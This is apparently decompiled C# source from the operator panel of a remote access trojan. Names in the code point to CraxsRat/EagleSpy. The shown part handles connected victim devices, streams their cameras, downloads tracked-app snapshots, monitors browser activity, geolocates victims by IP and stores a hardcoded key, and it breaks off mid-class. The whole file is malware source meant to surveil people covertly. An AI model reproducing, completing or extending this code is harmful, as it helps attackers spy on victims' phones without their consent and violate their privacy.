using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using GeoIPCitys;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000D0 RID: 208
public sealed class Data
{
	// Token: 0x060008E2 RID: 2274 RVA: 0x000D0E64 File Offset: 0x000CF064
	public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhsdkax()
	{
		string path = Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf";
		Data.imageListLarge = new Collection();
		Data.LockRemoveCard = new Collection();
		Data.ClientsOnline = new Collection();
		for (;;)
		{
			try
			{
				if (!File.Exists(path))
				{
					File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
				}
				string[] array = File.ReadAllLines(path);
				if (array.GetValue(0).ToString().Length < 3)
				{
					File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
					Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
				}
				else
				{
					Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
				}
				break;
			}
			catch (Exception ex)
			{
				File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
			}
		}
		SecurityKey.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwejhga();
		Data.GeoIP0 = new GeoIP(reso.res_Path + "\\GeoIP\\GeoIP.dat");
		Data.cityclass = new InfoClass(reso.res_Path + "\\GeoIP\\GeoIPCity.dat");
		Data.SPL_SOCKET = Data.password;
		Data.SPL_DATA = "x0D0x";
		Data.SPL_LINE = "x0L0x";
		Data.SPL_ARRAY = "x0A0x";
		bool flag = false;
		string[] files = Directory.GetFiles(reso.res_Path + "\\GeoIP\\Flags");
		string[] array2 = files;
		foreach (string text in array2)
		{
			if (!flag)
			{
				if (Operators.CompareString(SpySettings.FLAGS_Size, "32px", false) == 0)
				{
					Data.imageFlags.ImageSize = new Size(32, 32);
				}
				else if (Operators.CompareString(SpySettings.FLAGS_Size, "24px", false) == 0)
				{
					Data.imageFlags.ImageSize = new Size(24, 24);
				}
				else
				{
					Data.imageFlags.ImageSize = new Size(16, 16);
				}
				Data.imageFlags.ColorDepth = ColorDepth.Depth32Bit;
				flag = true;
			}
			string path2 = text;
			string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(path2);
			Data.imageFlags.Images.Add(fileNameWithoutExtension.ToUpper(), Image.FromFile(text));
		}
	}

	// Token: 0x060008E3 RID: 2275 RVA: 0x000D10B8 File Offset: 0x000CF2B8
	static Data()
	{
		Data.CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhsdkax();
	}

	// Token: 0x060008E4 RID: 2276 RVA: 0x000D11DC File Offset: 0x000CF3DC
	public static string Dir(string uuid)
	{
		string text = Data.CheckAndReplaceIllegalChars(reso.res_Path + "\\" + reso.users);
		string text2 = Data.CheckAndReplaceIllegalChars(text + "\\" + uuid);
		if (!Directory.Exists(text))
		{
			Directory.CreateDirectory(text);
		}
		if (!Directory.Exists(text2))
		{
			Directory.CreateDirectory(text2);
		}
		return text2;
	}

	// Token: 0x060008E5 RID: 2277 RVA: 0x000D1240 File Offset: 0x000CF440
	public static string CheckAndReplaceIllegalChars(string path)
	{
		char[] invalidPathChars = Path.GetInvalidPathChars();
		string text = path;
		char[] array = invalidPathChars;
		foreach (char value in array)
		{
			text = text.Replace(Conversions.ToString(value), "_");
		}
		return text;
	}

	// Token: 0x060008E6 RID: 2278 RVA: 0x000D128C File Offset: 0x000CF48C
	public static void LOGIT(Client Client, string Status, Bitmap flag)
	{
		try
		{
			if (Data.MainForm.checkenablelogs.Checked)
			{
				if (flag == null)
				{
					flag = (Bitmap)Codes.BlankImage();
				}
				if (Client == null)
				{
					Data.MainForm.addLog(new object[]
					{
						flag,
						Status,
						" ",
						"Blocked",
						" "
					});
				}
				else if (Operators.CompareString(MySettingsProperty.Settings.LOG, "Yes", false) == 0)
				{
					string clientAddressIP = Client.ClientAddressIP;
					Data.MainForm.addLog(new object[]
					{
						flag,
						clientAddressIP,
						GetCountryName2.GetCountryName(clientAddressIP),
						Status
					});
				}
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060008E7 RID: 2279 RVA: 0x000D1364 File Offset: 0x000CF564
	[DebuggerStepThrough]
	public static void HandelData(object ParametersObject)
	{
		Data.VB_0024StateMachine_39_HandelData vb_0024StateMachine_39_HandelData = new Data.VB_0024StateMachine_39_HandelData();
		vb_0024StateMachine_39_HandelData._0024VB_0024Local_ParametersObject = ParametersObject;
		vb_0024StateMachine_39_HandelData._0024State = -1;
		vb_0024StateMachine_39_HandelData._0024Builder = AsyncVoidMethodBuilder.Create();
		vb_0024StateMachine_39_HandelData._0024Builder.Start<Data.VB_0024StateMachine_39_HandelData>(ref vb_0024StateMachine_39_HandelData);
	}

	// Token: 0x060008E8 RID: 2280 RVA: 0x000D13A0 File Offset: 0x000CF5A0
	private static string CheckforSnap(string getCase)
	{
		string result;
		if (getCase.EndsWith(":SNP"))
		{
			result = getCase;
		}
		else
		{
			result = "null";
		}
		return result;
	}

	// Token: 0x060008E9 RID: 2281 RVA: 0x000D13C8 File Offset: 0x000CF5C8
	private static void SaveVideo(string thumbs, string Filename, Image img)
	{
		try
		{
			if (!Directory.Exists(thumbs + "\\" + Filename.Replace(".mp4", "")))
			{
				Directory.CreateDirectory(thumbs + "\\" + Filename.Replace(".mp4", ""));
			}
			img.Save(string.Concat(new string[]
			{
				thumbs,
				"\\",
				Filename.Replace(".mp4", ""),
				"\\",
				Filename.Replace(".mp4", Conversions.ToString(DateTime.Now.Millisecond) + ".jpg")
			}));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x060008EA RID: 2282 RVA: 0x000D14A0 File Offset: 0x000CF6A0
	private static void StartCamer(Client classClient, string encodString, Array sPLByte, TcpClient client)
	{
		try
		{
			if (!classClient.qit)
			{
				string[] array = encodString.Split(new string[]
				{
					Data.SPL_ARRAY
				}, StringSplitOptions.None);
				object[] collection = Data.GetCollection(array[1]);
				string name = "";
				try
				{
					name = "Camera_Manager_" + ((Client)collection[0]).ClientRemoteAddress;
				}
				catch (Exception ex)
				{
					classClient.isconnected = false;
					return;
				}
				CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
				if (cameraManager == null)
				{
					classClient.isconnected = false;
				}
				else
				{
					if (!cameraManager.Changed)
					{
						cameraManager.Changed = true;
						cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
						cameraManager.classCamera = classClient;
						Data.MainForm.Invoke(new VB_0024AnonymousDelegate_0(delegate()
						{
							cameraManager.Button3.Enabled = true;
							cameraManager.statustext.Text = "Connected - " + cameraManager.SelectedCamera;
						}));
					}
					byte[] array2 = (byte[])sPLByte.GetValue(1);
					using (MemoryStream memoryStream = new MemoryStream(array2))
					{
						using (Bitmap bitmap = (Bitmap)Image.FromStream(memoryStream))
						{
							Bitmap imag = new Bitmap(bitmap);
							cameraManager.CAM0.Image = cameraManager.RotateFlip(imag);
							cameraManager.UpdateFPS();
							checked
							{
								cameraManager.FPSTMP++;
							}
							cameraManager.SizeFrame = reso.BytesConverter((long)array2.Length);
						}
					}
				}
			}
		}
		catch (Exception ex2)
		{
		}
	}

	// Token: 0x060008EB RID: 2283 RVA: 0x000D16B8 File Offset: 0x000CF8B8
	private static string checkforINFO(string thecase)
	{
		string result;
		if (thecase.ToLower().Contains(SecurityKey.down_info.ToLower()))
		{
			result = thecase;
		}
		else
		{
			result = "null";
		}
		return result;
	}

	// Token: 0x060008EC RID: 2284 RVA: 0x000D16E8 File Offset: 0x000CF8E8
	private static string checkforDB(string thecase)
	{
		string result;
		if (thecase.ToLower().Contains(SecurityKey.downByte.ToLower()))
		{
			result = thecase;
		}
		else
		{
			result = "null";
		}
		return result;
	}

	// Token: 0x060008ED RID: 2285 RVA: 0x000D1718 File Offset: 0x000CF918
	private static string checkforview(string thecase)
	{
		string result;
		if (thecase.ToLower().Contains(SecurityKey.ImageViewer.ToLower()))
		{
			result = thecase;
		}
		else
		{
			result = "null";
		}
		return result;
	}

	// Token: 0x060008EE RID: 2286 RVA: 0x000D1748 File Offset: 0x000CF948
	private static string CheckforSCv2(string thecase)
	{
		string result;
		if (thecase.ToLower().StartsWith("-832"))
		{
			result = thecase;
		}
		else
		{
			result = "null";
		}
		return result;
	}

	// Token: 0x060008EF RID: 2287 RVA: 0x000D1774 File Offset: 0x000CF974
	private static DataGridViewCell[] Search(string value, DataGridView grDataGrid)
	{
		DataGridViewCell[] result;
		try
		{
			DataGridViewCell[] array = (from object row in grDataGrid.Rows
			select (DataGridViewRow)row into row
			from cell in 
				from object cell in row.Cells
				select (DataGridViewCell)cell
			select cell into cell
			where Operators.ConditionalCompareObjectEqual(cell.Tag, value, false)
			select cell).ToArray<DataGridViewCell>();
			result = array;
		}
		catch (Exception ex)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x060008F0 RID: 2288 RVA: 0x000D1840 File Offset: 0x000CFA40
	public static object[] CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsquyi(string ParametersUUID, Client Clasclient)
	{
		bool flag = false;
		object[] result;
		if (!Data.MainForm.IsDisposed)
		{
			try
			{
				Data.MainForm.Addnewrow(new object[]
				{
					Clasclient
				});
			}
			catch (Exception ex)
			{
			}
			Data.LastClient = Clasclient;
			if (SpySettings.NOTI_SOUND && File.Exists(Notif_Sound.getsoundpath()) && Notif_Sound.aMedia.IsLoadCompleted)
			{
				try
				{
					Notif_Sound.aMedia.Play();
				}
				catch (InvalidOperationException ex2)
				{
				}
			}
			result = new object[]
			{
				Clasclient.Row,
				flag
			};
		}
		else
		{
			result = new object[]
			{
				null,
				flag
			};
		}
		return result;
	}

	// Token: 0x060008F1 RID: 2289 RVA: 0x000D1914 File Offset: 0x000CFB14
	public static DataGridViewRow GetTherow(string UUID)
	{
		DataGridViewRow result;
		if (Data.MainForm.ClientsWindow.Rows.Count > 0)
		{
			result = Data.MainForm.ClientsWindow.Rows.Cast<DataGridViewRow>().FirstOrDefault((DataGridViewRow row) => row.Cells[2].Tag != null && Operators.CompareString(row.Cells[2].Tag.ToString(), UUID, false) == 0);
		}
		else
		{
			result = null;
		}
		return result;
	}

	// Token: 0x060008F2 RID: 2290 RVA: 0x000D1974 File Offset: 0x000CFB74
	public static bool isoldclient(string UUID)
	{
		bool result;
		if (Data.MainForm.ClientsWindow.Rows.Count > 0)
		{
			DataGridViewRow dataGridViewRow = Data.MainForm.ClientsWindow.Rows.Cast<DataGridViewRow>().FirstOrDefault((DataGridViewRow row) => row.Cells[2].Tag != null && Operators.CompareString(row.Cells[2].Tag.ToString(), UUID, false) == 0);
			result = (dataGridViewRow != null);
		}
		else
		{
			result = false;
		}
		return result;
	}

	// Token: 0x060008F3 RID: 2291 RVA: 0x000D19D8 File Offset: 0x000CFBD8
	public static object[] GetCollection(string ID)
	{
		object[] result;
		try
		{
			Dictionary<string, Client> clientRowIndices = Data._clientRowIndices;
			lock (clientRowIndices)
			{
				object[] array2;
				if (Data._clientRowIndices.ContainsKey(ID))
				{
					object[] array = new object[2];
					array[0] = Data._clientRowIndices[ID];
					array2 = array;
					array[1] = Data._clientRowIndices[ID].myClient;
				}
				else
				{
					array2 = new object[2];
				}
				result = array2;
			}
		}
		catch (Exception ex)
		{
			result = new object[2];
		}
		return result;
	}

	// Token: 0x060008F4 RID: 2292 RVA: 0x000D1A78 File Offset: 0x000CFC78
	public static Image Effect(Image img)
	{
		return img;
	}

	// Token: 0x04000D7C RID: 3452
	public static string Sessionkey = "";

	// Token: 0x04000D7D RID: 3453
	public static string GlobalKey1 = "";

	// Token: 0x04000D7E RID: 3454
	public static string GlobalKey2 = "";

	// Token: 0x04000D7F RID: 3455
	public static string GlobalKey3 = "";

	// Token: 0x04000D80 RID: 3456
	public static Dictionary<string, Client> _clientRowIndices = new Dictionary<string, Client>();

	// Token: 0x04000D81 RID: 3457
	public static object SyncWorkerRemove = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x04000D82 RID: 3458
	public static object Lockactive = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x04000D83 RID: 3459
	public static bool Echoed = false;

	// Token: 0x04000D84 RID: 3460
	public static Collection SyncClientsOnline = new Collection();

	// Token: 0x04000D85 RID: 3461
	public static object SyncRequestsReceiver = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x04000D86 RID: 3462
	public static object SyncListWorker = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x04000D87 RID: 3463
	public static object SyncWorkerRequests = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x04000D88 RID: 3464
	public static object SyncDataHandel = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x04000D89 RID: 3465
	public static object SyncNotifications = RuntimeHelpers.GetObjectValue(new object());

	// Token: 0x04000D8A RID: 3466
	public static string SPL_SOCKET;

	// Token: 0x04000D8B RID: 3467
	public static string SPL_DATA;

	// Token: 0x04000D8C RID: 3468
	public static string SPL_LINE;

	// Token: 0x04000D8D RID: 3469
	public static string SPL_ARRAY;

	// Token: 0x04000D8E RID: 3470
	public static EagleSpyMain MainForm;

	// Token: 0x04000D8F RID: 3471
	public static Client LastClient = null;

	// Token: 0x04000D90 RID: 3472
	public static GeoIP GeoIP0;

	// Token: 0x04000D91 RID: 3473
	public static string password = "";

	// Token: 0x04000D92 RID: 3474
	public static ImageList imageFlags = new ImageList();

	// Token: 0x04000D93 RID: 3475
	public static string Thumbs = reso.res_Path + "\\Thumbs";

	// Token: 0x04000D94 RID: 3476
	private static Collection imageListLarge = new Collection();

	// Token: 0x04000D95 RID: 3477
	public static Collection ClientsOnline = new Collection();

	// Token: 0x04000D96 RID: 3478
	public static string Filenamethum;

	// Token: 0x04000D97 RID: 3479
	public static InfoClass cityclass = new InfoClass();

	// Token: 0x04000D98 RID: 3480
	public static bool Cameraison = false;

	// Token: 0x04000D99 RID: 3481
	public static Collection LockRemoveCard;

	// Token: 0x04000D9A RID: 3482
	public static string THEKEY = "Nagato";

	// Token: 0x04000D9B RID: 3483
	public static string JK = "BSN12345678901234567";

	// Token: 0x020000D1 RID: 209
	// (Invoke) Token: 0x060008F7 RID: 2295
	public delegate void Delegatex(object ParametersObject);

	// Token: 0x020000D4 RID: 212
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D0
	{
		// Token: 0x0600091D RID: 2333 RVA: 0x000DEAC8 File Offset: 0x000DCCC8
		public _Closure_0024__39_002D0(Data._Closure_0024__39_002D0 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_SPL = arg0._0024VB_0024Local_SPL;
			}
		}

		// Token: 0x0600091E RID: 2334 RVA: 0x000DEAF0 File Offset: 0x000DCCF0
		internal void _Lambda_0024__1()
		{
			try
			{
				if (Operators.CompareString(this._0024VB_0024Local_SPL[8].ToString(), "-1", false) != 0)
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wallpaper = reso.Wallpaper(this._0024VB_0024Local_SPL[8], 48, 48, this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient);
				}
			}
			catch (Exception ex)
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wallpaper = (Bitmap)Codes.BlankImage();
			}
			try
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
			}
			catch (Exception ex2)
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
			}
		}

		// Token: 0x0600091F RID: 2335 RVA: 0x000DEBD4 File Offset: 0x000DCDD4
		internal void _Lambda_0024__2()
		{
			if (this._0024VB_0024Local_SPL[11] != "-1")
			{
				string left = this._0024VB_0024Local_SPL[11];
				if (Operators.CompareString(left, "1", false) != 0)
				{
					if (Operators.CompareString(left, "0", false) != 0)
					{
						this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
					}
					else
					{
						this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources._3g;
					}
				}
				else
				{
					this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
				}
			}
			else
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
			}
		}

		// Token: 0x04000FC9 RID: 4041
		public string[] _0024VB_0024Local_SPL;

		// Token: 0x04000FCA RID: 4042
		public Data._Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_2;
	}

	// Token: 0x020000D5 RID: 213
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D1
	{
		// Token: 0x06000920 RID: 2336 RVA: 0x000DEC7C File Offset: 0x000DCE7C
		public _Closure_0024__39_002D1(Data._Closure_0024__39_002D1 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_ClassClient = arg0._0024VB_0024Local_ClassClient;
			}
		}

		// Token: 0x06000921 RID: 2337 RVA: 0x000DECA4 File Offset: 0x000DCEA4
		internal void _Lambda_0024__10()
		{
			if (this._0024VB_0024Local_ClassClient.FirewallTable.Rows.Count > 0)
			{
				this._0024VB_0024Local_ClassClient.FirewallTable.Rows.Clear();
			}
		}

		// Token: 0x06000922 RID: 2338 RVA: 0x000DECE0 File Offset: 0x000DCEE0
		internal void _Lambda_0024__13()
		{
			if (this._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Count > 0)
			{
				this._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Clear();
			}
			if (Data.MainForm.combodatestrack.Items != null && Data.MainForm.combodatestrack.Items.Count > 0)
			{
				Data.MainForm.combodatestrack.Items.Clear();
				Data.MainForm.combodatestrack.Text = "";
			}
		}

		// Token: 0x04000FCB RID: 4043
		public Client _0024VB_0024Local_ClassClient;
	}

	// Token: 0x020000D6 RID: 214
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D10
	{
		// Token: 0x06000923 RID: 2339 RVA: 0x000DED74 File Offset: 0x000DCF74
		public _Closure_0024__39_002D10(Data._Closure_0024__39_002D10 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_collect = arg0._0024VB_0024Local_collect;
				this._0024VB_0024Local_Appname = arg0._0024VB_0024Local_Appname;
				this._0024VB_0024Local_datesandinfo = arg0._0024VB_0024Local_datesandinfo;
			}
		}

		// Token: 0x06000924 RID: 2340 RVA: 0x000DEDB4 File Offset: 0x000DCFB4
		internal void _Lambda_0024__14()
		{
			if (this._0024VB_0024Local_collect[0].Equals("O"))
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Add(new object[]
				{
					Codes.ResizeImage(Resources.ok, new Size(32, 32), false),
					this._0024VB_0024Local_Appname,
					this._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords,
					this._0024VB_0024Local_collect[2],
					Codes.ProcessJson(this._0024VB_0024Local_datesandinfo[0])
				});
			}
			else if (this._0024VB_0024Local_collect[0].Equals("N"))
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Add(new object[]
				{
					Codes.ResizeImage(Resources.notok, new Size(32, 32), false),
					this._0024VB_0024Local_Appname,
					this._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords,
					this._0024VB_0024Local_collect[2],
					""
				});
			}
		}

		// Token: 0x04000FCC RID: 4044
		public string[] _0024VB_0024Local_collect;

		// Token: 0x04000FCD RID: 4045
		public string _0024VB_0024Local_Appname;

		// Token: 0x04000FCE RID: 4046
		public string[] _0024VB_0024Local_datesandinfo;

		// Token: 0x04000FCF RID: 4047
		public Data._Closure_0024__39_002D11 _0024VB_0024NonLocal__0024VB_0024Closure_10;
	}

	// Token: 0x020000D7 RID: 215
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D11
	{
		// Token: 0x06000925 RID: 2341 RVA: 0x000DEED0 File Offset: 0x000DD0D0
		public _Closure_0024__39_002D11(Data._Closure_0024__39_002D11 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_HasRecords = arg0._0024VB_0024Local_HasRecords;
			}
		}

		// Token: 0x04000FD0 RID: 4048
		public string _0024VB_0024Local_HasRecords;

		// Token: 0x04000FD1 RID: 4049
		public Data._Closure_0024__39_002D13 _0024VB_0024NonLocal__0024VB_0024Closure_9;
	}

	// Token: 0x020000D8 RID: 216
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D12
	{
		// Token: 0x06000926 RID: 2342 RVA: 0x000DEEF8 File Offset: 0x000DD0F8
		public _Closure_0024__39_002D12(Data._Closure_0024__39_002D12 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_DownSnap = arg0._0024VB_0024Local_DownSnap;
				this._0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
			}
		}

		// Token: 0x06000927 RID: 2343 RVA: 0x000DEF2C File Offset: 0x000DD12C
		internal void _Lambda_0024__15()
		{
			this._0024VB_0024Local_DownSnap = new snapsdownloader();
			this._0024VB_0024Local_DownSnap.Name = this._0024VB_0024Local_handle;
			this._0024VB_0024Local_DownSnap.infotext.Text = string.Concat(new string[]
			{
				"Name: ",
				this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientName,
				Strings.Space(4),
				"IP: ",
				this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientAddressIP
			});
			this._0024VB_0024Local_DownSnap.clipic.Image = this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.Wallpaper;
			this._0024VB_0024Local_DownSnap.totaltext.Text = "-> Total : " + this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", "");
			this._0024VB_0024Local_DownSnap.statustext.Text = "-> Status : Starting";
			this._0024VB_0024Local_DownSnap.finishedtext.Text = "-> Finished: 0";
			this._0024VB_0024Local_DownSnap.lefttext.Text = "-> Left: " + this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", "");
			this._0024VB_0024Local_DownSnap.totalImages = int.Parse(this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", ""));
			this._0024VB_0024Local_DownSnap.Downloadfolder = this._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.FolderUSER + "\\Tracker_Snaps";
			if (!Directory.Exists(this._0024VB_0024Local_DownSnap.Downloadfolder))
			{
				Directory.CreateDirectory(this._0024VB_0024Local_DownSnap.Downloadfolder);
			}
			this._0024VB_0024Local_DownSnap.Show();
		}

		// Token: 0x04000FD2 RID: 4050
		public snapsdownloader _0024VB_0024Local_DownSnap;

		// Token: 0x04000FD3 RID: 4051
		public string _0024VB_0024Local_handle;

		// Token: 0x04000FD4 RID: 4052
		public Data._Closure_0024__39_002D13 _0024VB_0024NonLocal__0024VB_0024Closure_11;
	}

	// Token: 0x020000D9 RID: 217
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D13
	{
		// Token: 0x06000928 RID: 2344 RVA: 0x000DF0FC File Offset: 0x000DD2FC
		public _Closure_0024__39_002D13(Data._Closure_0024__39_002D13 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_arry2 = arg0._0024VB_0024Local_arry2;
			}
		}

		// Token: 0x04000FD5 RID: 4053
		public string[] _0024VB_0024Local_arry2;

		// Token: 0x04000FD6 RID: 4054
		public Data._Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_8;
	}

	// Token: 0x020000DA RID: 218
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D14
	{
		// Token: 0x06000929 RID: 2345 RVA: 0x000DF124 File Offset: 0x000DD324
		public _Closure_0024__39_002D14(Data._Closure_0024__39_002D14 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_appname = arg0._0024VB_0024Local_appname;
			}
		}

		// Token: 0x0600092A RID: 2346 RVA: 0x00003ABA File Offset: 0x00001CBA
		internal void _Lambda_0024__16()
		{
			EagleAlert.ShowSucess(this._0024VB_0024Local_appname + " record has been Removed");
		}

		// Token: 0x0600092B RID: 2347 RVA: 0x00003AD1 File Offset: 0x00001CD1
		internal void _Lambda_0024__17()
		{
			EagleAlert.ShowSucess(this._0024VB_0024Local_appname + " error while removing...");
		}

		// Token: 0x04000FD7 RID: 4055
		public string _0024VB_0024Local_appname;
	}

	// Token: 0x020000DB RID: 219
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D15
	{
		// Token: 0x0600092C RID: 2348 RVA: 0x000DF14C File Offset: 0x000DD34C
		public _Closure_0024__39_002D15(Data._Closure_0024__39_002D15 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_BrowserMonitor = arg0._0024VB_0024Local_BrowserMonitor;
			}
		}

		// Token: 0x0600092D RID: 2349 RVA: 0x00003AE8 File Offset: 0x00001CE8
		internal void _Lambda_0024__18()
		{
			this._0024VB_0024Local_BrowserMonitor.datalogtext.Text = "";
		}

		// Token: 0x0600092E RID: 2350 RVA: 0x00003AFF File Offset: 0x00001CFF
		internal void _Lambda_0024__19()
		{
			this._0024VB_0024Local_BrowserMonitor.linkspanel.Controls.Clear();
		}

		// Token: 0x0600092F RID: 2351 RVA: 0x00003B16 File Offset: 0x00001D16
		internal void _Lambda_0024__20()
		{
			this._0024VB_0024Local_BrowserMonitor.MapData.Clear();
			this._0024VB_0024Local_BrowserMonitor.namescombo.Items.Clear();
		}

		// Token: 0x04000FD8 RID: 4056
		public WebViewMonitor _0024VB_0024Local_BrowserMonitor;
	}

	// Token: 0x020000DC RID: 220
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D16
	{
		// Token: 0x06000930 RID: 2352 RVA: 0x000DF174 File Offset: 0x000DD374
		public _Closure_0024__39_002D16(Data._Closure_0024__39_002D16 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_name = arg0._0024VB_0024Local_name;
				this._0024VB_0024Local_lnk = arg0._0024VB_0024Local_lnk;
				this._0024VB_0024Local_id = arg0._0024VB_0024Local_id;
			}
		}

		// Token: 0x06000931 RID: 2353 RVA: 0x000DF1B4 File Offset: 0x000DD3B4
		internal void _Lambda_0024__21()
		{
			this._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.namescombo.Items.Add(this._0024VB_0024Local_name);
			if (!this._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.MapData.ContainsKey(this._0024VB_0024Local_name))
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.MapData.Add(this._0024VB_0024Local_name, this._0024VB_0024Local_lnk + ":" + this._0024VB_0024Local_id);
			}
		}

		// Token: 0x04000FD9 RID: 4057
		public string _0024VB_0024Local_name;

		// Token: 0x04000FDA RID: 4058
		public string _0024VB_0024Local_lnk;

		// Token: 0x04000FDB RID: 4059
		public string _0024VB_0024Local_id;

		// Token: 0x04000FDC RID: 4060
		public Data._Closure_0024__39_002D15 _0024VB_0024NonLocal__0024VB_0024Closure_12;
	}

	// Token: 0x020000DD RID: 221
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D17
	{
		// Token: 0x06000932 RID: 2354 RVA: 0x000DF234 File Offset: 0x000DD434
		public _Closure_0024__39_002D17(Data._Closure_0024__39_002D17 arg0)
		{
			if (arg0 != null)
			{
				this._0024VB_0024Local_name = arg0._0024VB_0024Local_name;
				this._0024VB_0024Local_lnk = arg0._0024VB_0024Local_lnk;
				this._0024VB_0024Local_id = arg0._0024VB_0024Local_id;
			}
		}

		// Token: 0x06000933 RID: 2355 RVA: 0x000DF274 File Offset: 0x000DD474
		internal void _Lambda_0024__22()
		{
			this._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.namescombo.Items.Add(this._0024VB_0024Local_name);
			if (!this._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.MapData.ContainsKey(this._0024VB_0024Local_name))
			{
				this._0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.MapData.Add(this._0024VB_0024Local_name, this._0024VB_0024Local_lnk + ":" + this._0024VB_0024Local_id);
			}
		}

		// Token: 0x04000FDD RID: 4061
		public string _0024VB_0024Local_name;

		// Token: 0x04000FDE RID: 4062
		public string _0024VB_0024Local_lnk;

		// Token: 0x04000FDF RID: 4063
		public string _0024VB_0024Local_id;

		// Token: 0x04000FE0 RID: 4064
		public Data._Closure_0024__39_002D15 _0024VB_0024NonLocal__0024VB_0024Closure_13;
	}

	// Token: 0x020000DE RID: 222
	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D2
	{
